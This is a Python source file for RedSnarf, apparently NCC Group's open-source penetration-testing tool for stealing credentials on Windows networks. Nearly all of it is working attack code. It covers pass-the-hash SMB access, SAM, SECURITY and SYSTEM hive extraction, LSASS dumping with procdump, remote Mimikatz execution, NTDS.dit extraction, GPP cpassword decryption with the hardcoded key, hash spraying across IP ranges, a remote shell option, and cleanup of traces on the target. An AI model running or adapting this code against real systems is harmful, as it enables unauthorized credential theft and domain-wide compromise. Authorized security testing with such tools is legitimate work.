#! /usr/bin/python
# Released as open source by NCC Group Plc - https://www.nccgroup.trust/uk/
# https://github.com/nccgroup/redsnarf
# Released under Apache V2 see LICENCE for more information

import os, argparse, signal, sys, re, binascii, subprocess

try:
	from netaddr import IPNetwork
except ImportError:
	print ('Netaddr appears to be missing - try: easy_install netaddr')
	exit(1)

try:
	from termcolor import colored 
except ImportError:
	print ('termcolor appears to be missing - try: easy_install termcolor')
	exit(1)

from Crypto.Cipher import AES
from base64 import b64decode
from socket import *
from threading import Thread

from impacket.smbconnection import *

yesanswers = ["yes", "y", "Y", "Yes", "YES"]
noanswers = ["no", "NO", "n", "N"]
events_logs = ["application","security","setup","system"]

def banner():
	print """
   ______           .____________                     _____  
\______   \ ____   __| _/   _____/ ____ _____ ________/ ____\ 
 |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\  
 |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
 |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
        \/     \/     \/       \/     \/     \/                      

"""
	print colored("\nE D Williams - NCCGroup",'red')
	print colored("R Davy - NCCGroup\n",'red')

def gppdecrypt(cpassword_pass):
	#Original code taken from the resource below.
	#https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
	key = binascii.unhexlify("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
	cpassword = cpassword_pass
	cpassword += "=" * ((4 - len(sys.argv[1]) % 4) % 4)
	password = b64decode(cpassword)
	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')

def datadump(user, passw, host, path, os_version):
	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
	signal_number = (return_value & 0x0F)
	if not signal_number:
		exit_status = (return_value >> 8)
		if exit_status:
			print colored("[-]Something went wrong connecting to: "+host,'red')
		else:
			if not os.path.exists(path+host):
				os.makedirs(path+host)
				print colored("[+]Creating directory for host: "+host,'green')
			try:
				print colored("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host,'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C reg save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system\" >/dev/null 2>&1")

			except OSError:
				print colored("[-]Something went wrong here getting reg hives from: "+host,'red')

			for f in files:
				try:
					print colored("[+]getting: "+f,'yellow')
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
				except OSError:
					print colored("[-]Something went wrong here getting files via smbclient("+f+"): "+host,'red')
			try:
				print colored("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host,'green')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\sam && del c:\security && del c:\system\" 2>/dev/null")
			except OSError:
				print colored("[-]Something went wrong here getting reg hives: "+host,'red')
			try:
				print colored("[+]Using pwdump: "+host,'green')
				if os.path.exists(creddump7path+"pwdump.py"):
					os.system(creddump7path+"pwdump.py "+path+host+"/system "+path+host+"/sam | tee "+path+host+"/pwdump")
			except OSError:
				print colored("[-]Something went wrong extracting from pwdump: "+host,'red')
			if skiplsacache in noanswers:
				try:
					print colored("[+]getting remote version: "+host,'green')
					print os_version
					if os_version!='':												
						if os_version.find('Server 2003')!=-1:
							print colored("[+]Server 2003 Found..oh dear",'blue')							
							for p in progs:
								try:
									print colored("[+]Using "+p+": "+host ,'green')
									if os.path.exists(creddump7path+p+".py"):
										os.system(creddump7path+p+".py "+path+host+"/system "+path+host+"/security false | tee "+path+host+"/"+p+"")
								except OSError:
										print colored("[-]Something went wrong extracting from "+p,'red')
								if os.stat(path+host+"/cachedump").st_size == 0:
									print colored("[-]No cached creds for: "+host,'yellow')
						else:
							for p in progs:
								try:
									print colored("[+]Using "+p+": "+host ,'green')
									if os.path.exists(creddump7path+p+".py"):
										os.system(creddump7path+p+".py "+path+host+"/system "+path+host+"/security true | tee "+path+host+"/"+p+"")
								except OSError:
									print colored("[-]Something went wrong extracting from "+p,'red')
								if os.stat(path+host+"/cachedump").st_size == 0:
									print colored("[-]No cached creds for: "+host,'yellow')
					else:
						print colored("[-]os version not found",'red')        
				except OSError:
					print colored("[-]Something went wrong getting os version",'red')

			if service_accounts in yesanswers:
				print colored("[+]Checking for services running as users: "+host,'yellow')
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\users.txt\" 2>/dev/null")
				os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
				res = os.stat(path+host+"/users.txt").st_size > 3
				if res==True:
					try:
						u = open(path+host+"/users.txt").read().splitlines()
						for n in u:
							if n:
								print "\t"+n
					except IOError as e:
						print "I/O error({0}): {1}".format(e.errno, e.strerror)
				else:
					print colored("[-]No service accounts found: "+host,'red')	

			if lsass_dump in yesanswers:
				if not os.path.isfile("/opt/Procdump/procdump.exe"):
					print colored("[-]Cannot see procdump.exe in /opt/Procdump/ ",'red')
					print colored("[-]Download from https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx",'yellow')
					exit(1)
				else:
					print colored("[+]Procdump.exe found",'green')
				try:
					print colored("[+]getting dump of lsass: "+host,'green')
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
					if os.path.isfile(outputpath+host+"/lsass.dmp"):
						print colored("[+]lsass.dmp file found",'green')
					else:
						print colored("[-]lsass.dmp file not found",'red')        
				except OSError:
					print colored("[-]Something went wrong getting lsass.dmp",'red')

			if massmimi_dump in yesanswers:
				try:
					print colored("[+]Attempting to Run Mimikatz",'green')
					fout=open('/tmp/mimi.ps1','w')
					fout.write('Import-Module c:\\Invoke-Mimikatz.ps1\n')
					fout.write('Invoke-Mimikatz -DumpCreds > c:\\mimi_creddump.txt\n')
					fout.write('exit\n')
					fout.close() 
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /usr/share/nishang/Gather; put Invoke-Mimikatz.ps1\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
						print colored("[+]mimi_creddump.txt file found",'green')
						if not os.path.isfile('/usr/bin/dos2unix'):
							print colored("[-]Cannot find dos2unix",'red')
							exit(1)				
						else:
							print colored("[+]Found dos2unix",'green')
							os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
							print colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump.txt",'yellow')
							print colored("[+]Basic parsed output:",'green')
							os.system("cat "+outputpath+host+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
					else:
						print colored("[-]mimi_creddump.txt file not found",'red')       
				except OSError:
					print colored("[-]Something went wrong running Mimikatz...",'red')

			
def signal_handler(signal, frame):
		print colored("\nCtrl+C pressed.. aborting...",'red')
		sys.exit()

def syschecks():
	winexe = os.system("which pth-winexe > /dev/null")
	if winexe != 0:
		print colored("[-]pth-winexe not installed",'red')
		exit(1)
	else:
		print colored("[+]pth-winexe installed",'green')
	smb = os.system("which /usr/bin/pth-smbclient > /dev/null")
	if smb != 0:
		print colored("[-]/usr/bin/pth-smbclient not installed",'red')
		exit(1)
	else:
		print colored("[+]pth-smbclient installed",'green')
	c = os.path.isdir(creddump7path)
	if not c:
		print colored("[-]creddump7 not installed in "+creddump7path,'red')
		print colored("[-]Clone from https://github.com/Neohapsis/creddump7",'yellow')
		print colored("[-]going to try and clone it now for you....., you're welcome",'yellow')
		os.system("git clone https://github.com/Neohapsis/creddump7 /opt/creddump7")
		exit(1)
	else:
		print colored("[+]creddump7 found",'green')

def run():
	for target in IPNetwork(targets):

		host=str(target)
		
		passwd=''

		if passw[len(passw)-3:] ==':::':
			lmhash, nthash ,s1,s2,s3 = passw.split(':')
		else:
			lmhash = ''
			nthash = ''

		if nthash=='':
			passwd=passw	

		try: 

			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10) 

			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
			
			if x==None or x==True:
				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession() ==0:
					print colored("[+]"+host+" responding to 445",'green')
					t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
					t.start()
					t.join()
				else:
					print colored("[-]"+host+" not responding on port 445",'red')
		except:
			print colored("[-]"+host+" not responding on port 445",'red')

def main():
	if credsfile!='':
		print colored('\n[+]Getting ready to spray some hashes...','yellow') 
		if os.path.isfile(credsfile):
			with open(credsfile,'r') as inifile:
				data=inifile.read()
				hash_list=data.splitlines()
				for tmphash in hash_list:
					tmphash = tmphash.replace('NO PASSWORD*********************', '00000000000000000000000000000000')
					pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
					pwdump = pwdumpmatch.match(tmphash)
					plaintextpassmatch = re.compile('^(\S+?)\s+(\S*?)$')
					plain = plaintextpassmatch.match(tmphash)
					wcematch = re.compile('^(\S+?):.*?:([0-9a-fA-F]{32}):([0-9a-fA-F]{32})\s*$')
					wce = wcematch.match(tmphash)
					if pwdump:
						try:
							userhash = tmphash
							splitter = userhash.split(":")
							username=splitter[0]
							passwd=splitter[2]+':'+splitter[3]+':::'
							print colored('\n[+]Spraying...','yellow') 
							run()
						except:
								print colored("[-] Credentials Error",'red')
					if wce:
						try:
							userhash = tmphash
							splitter = userhash.split(":")
							username=splitter[0]
							passwd=splitter[2]
							print colored('\n[+]Spraying...','yellow') 
							run()
						except:
								print colored("[-]Credentials Error",'red')
					if plain:
						try:
							userhash = tmphash
							splitter = userhash.split(" ")
							username=splitter[0]
							passwd=splitter[1]
							print colored('\n[+]Spraying...','yellow') 
							run()
						except:
								print colored("[-]Credentials Error",'red')
	else:
		run()
	if targets.find('/')!=-1:
		print colored ('\n[+]Range Detected - Now trying to merge pwdump files to '+mergepf,'yellow')

		for ip in IPNetwork(targets):
			if os.path.isfile(outputpath+str(ip)+'/pwdump'):
				print colored ('[+]Got a pwdump file for '+str(ip),'blue')
				fin=open(outputpath+str(ip)+'/pwdump','r')
				data2=fin.read()
				fin.close()
				fout=open('/tmp/tmpmerge.txt','a')
				fout.write(data2)
				fout.close() 
				print colored ('[+] Merged '+str(ip) + ' successfully','green')
			else:
				print colored('[-] Did not find a pwdump file for '+str(ip),'red')

		if os.path.isfile('/tmp/tmpmerge.txt'):
			os.system('cat /tmp/tmpmerge.txt | sort | uniq > '+mergepf)
		if os.path.isfile('/tmp/tmpmerge.txt'):
			os.system('rm /tmp/tmpmerge.txt')
		print colored ('\n[+] Check out '+mergepf+' for unique, sorted, merged hash list','yellow')

banner()
p = argparse.ArgumentParser("Simple example usage: ./%prog -H 192.168.0.1 -u administrator -p Password01", version="%prog 0.2")
p.add_argument("-H", "--host", dest="host", help="Specify a hostname or range to grab hashes from")
p.add_argument("-u", "--username", dest="username", default="administrator",help="Enter a username")
p.add_argument("-p", "--password", dest="password", default="Password01", help="Enter a password or hash")
p.add_argument("-C", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
p.add_argument("-c", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
p.add_argument("-o", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
p.add_argument("-m", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
p.add_argument("-S", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
p.add_argument("-d", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
p.add_argument("-l", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
p.add_argument("-P", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
p.add_argument("-D", "--domain_name", dest="domain_name", default=".", help="<Optional> Enter domain name")
p.add_argument("-g", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
p.add_argument("-n", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
p.add_argument("-i", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
p.add_argument("-M", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
p.add_argument("-a", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")

args = p.parse_args()

targets = args.host
user = args.username
passw = args.password
files = ['sam', 'system', 'security']
progs = ['cachedump','lsadump']

creddump7path=args.credpath
outputpath=args.outputpath
mergepf=args.mergepf
credsfile=args.credsfile
skiplsacache=args.skiplsacache
dropshell=args.dropshell
lsass_dump=args.lsass_dump
policiesscripts_dump=args.policiesscripts_dump
domain_name=args.domain_name
c_password=args.c_password
ntds_util=args.ntds_util
drsuapi=args.drsuapi
massmimi_dump=args.massmimi_dump
service_accounts=args.service_accounts

if drsuapi in yesanswers:
	if targets.find('/')==-1:
		try:
			if not os.path.isfile('/usr/local/bin/secretsdump.py'):
				print colored("[-]No secretsdump.py",'red')
				print colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow')
				print colored("[-]and run: python setup.py install",'yellow')
				exit(1)				
			else:
				print colored("[+]Found secretsdump",'green')
			if not os.path.isdir(outputpath+targets):
				os.makedirs(outputpath+targets)
				print colored("[+]Creating directory for host: "+outputpath+targets,'green')
			else:
				print colored("[+]Found directory for: "+outputpath+targets,'green')
			print colored("[+]Saving hashes to: "+outputpath+targets+'/drsuapi_gethashes.txt','yellow')
			pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
			pwdump = pwdumpmatch.match(passw)
			if pwdump:
				os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets +'> '+outputpath+targets+'/drsuapi_gethashes.txt')
			else:
				os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets +'> '+outputpath+targets+'/drsuapi_gethashes.txt')
			if os.path.isfile(outputpath+targets+"/drsuapi_gethashes.txt"):
				print colored("[+]Found file - completed : "+outputpath+targets,'green')
				sys.exit()
			else:
				print colored("[-]Something has gone horribly wrong......",'red')
		except OSError:
			print colored("[-]Something went wrong using the drsuapi method",'red')
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if ntds_util in yesanswers:
	if targets.find('/')==-1:
		try:
			if not os.path.isdir(outputpath+targets):
				os.makedirs(outputpath+targets)
				print colored("[+]Creating directory for host: "+outputpath+targets,'green')
			else:
				print colored("[+]Found directory for : "+outputpath+targets,'green')
			print colored("[+]Attempting to grab a copy of NTDS.dit using NTDSUtil",'green')
			pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
			fout=open('/tmp/ntds.bat','w')
			fout.write('@echo off\n')
			fout.write(pscommand)
			fout.close() 
			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C c:\\ntds.bat\" < /dev/null")
			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget registry; exit'")
			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit'")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C rd /s /q c:\\redsnarf\"")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C del c:\\ntds.bat\"") 
			if os.path.isfile(outputpath+targets+'/registry/SYSTEM') and os.path.isfile(outputpath+targets+'/Active Directory/ntds.dit'):	
				print colored("[+]Found SYSTEM and ntds.dit",'green')
				print colored("[+]Extracting Hash Database to "+outputpath+targets+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')
				os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+outputpath+targets+'/registry/SYSTEM '+ "-ntds "+outputpath+targets+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets+"/hashdump.txt local")
				if os.path.isfile(outputpath+targets+'/hashdump.txt.ntds'):
					print colored("[+]Hashes successfully output to "+outputpath+targets+'/hashdump.txt.ntds','green')
				else:
					print colored("[-]Somthing went wrong extracting hashes','red'")	
				print colored("[+]Gathering hash history...",'yellow')	
				os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -history -system "+outputpath+targets+'/registry/SYSTEM '+ "-ntds "+outputpath+targets+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets+"/hashhistoryhashdump.txt local")
				if os.path.isfile(outputpath+targets+'/hashhistoryhashdump.txt.ntds'):
					print colored("[+]Hashes successfully output to "+outputpath+targets+'/hashhistorydump.txt.ntds','green')
				else:
					print colored("[-]Somthing went wrong extracting hash history','red'")	
			else:
				print colored("[-]missing SYSTEM and ntds.dit",'red')
			sys.exit()		
		except OSError:
			print colored("[-]Something went wrong dumping NTDS.dit",'red')
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if c_password!='':
	try:
		banner()
		print colored("[+]Attempting to decrypt cpassword:",'yellow')
		gppdecrypt(c_password)
		sys.exit()
	except:
		sys.exit()

if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
	if targets.find('/')==-1:
		if user!='' and passw!='' and targets!='':
			print colored("[+]Attempting to download contents of Policies and scripts from sysvol and search for administrator and password:",'yellow')

			if not os.path.isdir(outputpath+targets):
				os.makedirs(outputpath+targets)
				print colored("[+]Creating directory for host: "+outputpath+targets,'green')
			else:
				print colored("[+]Found directory for : "+outputpath+targets,'green')
			if os.path.isdir(outputpath+targets):
				print colored("[+]Attempting to download policies folder from /sysvol",'green')		
				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit'")
				print colored("[+]Attempting to download scripts folder from /sysvol",'green')	
				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit'")
				if os.path.isdir(outputpath+targets+'/scripts/'):
					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets+'/scripts/','green')	
					os.chdir(outputpath+targets+'/scripts/')
					os.system("pwd")
					os.system("grep --color='auto' -ri administrator")
					os.system("grep --color='auto' -ri password")
				if os.path.isdir(outputpath+targets+'/Policies/'):
					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets+'/Policies/','green')	
					os.chdir(outputpath+targets+'/Policies/')
					os.system("pwd")
					os.system("grep --color='auto' -ri administrator")
					os.system("grep --color='auto' -ri password")
				sys.exit()
		else:
			print colored ('[-]Something has gone wrong check your parameters!, Try --help for a list of parameters','red')
			print colored ('[-]Usage - ./redsnarf.py -H 10.0.0.1 -u username -p password -P y -D domain','yellow')
			sys.exit()
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if dropshell in yesanswers:
	if targets.find('/')==-1:
		try:
			print colored ('\n[+] Dropping Shell on '+targets+'\n','yellow')
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe\" 2>/dev/null")
			sys.exit()
		except:
			sys.exit()
	else:
		print colored ('\n[-]It is only possible to drop a shell on a single target and not a range','red')
		sys.exit()
if targets is None:
	print colored ('[-]You have not entered a target!, Try --help for a list of parameters','red')
	sys.exit()

syschecks()

if __name__ == '__main__':
	signal.signal(signal.SIGINT, signal_handler)
	main()
	print colored("[+]end",'green')
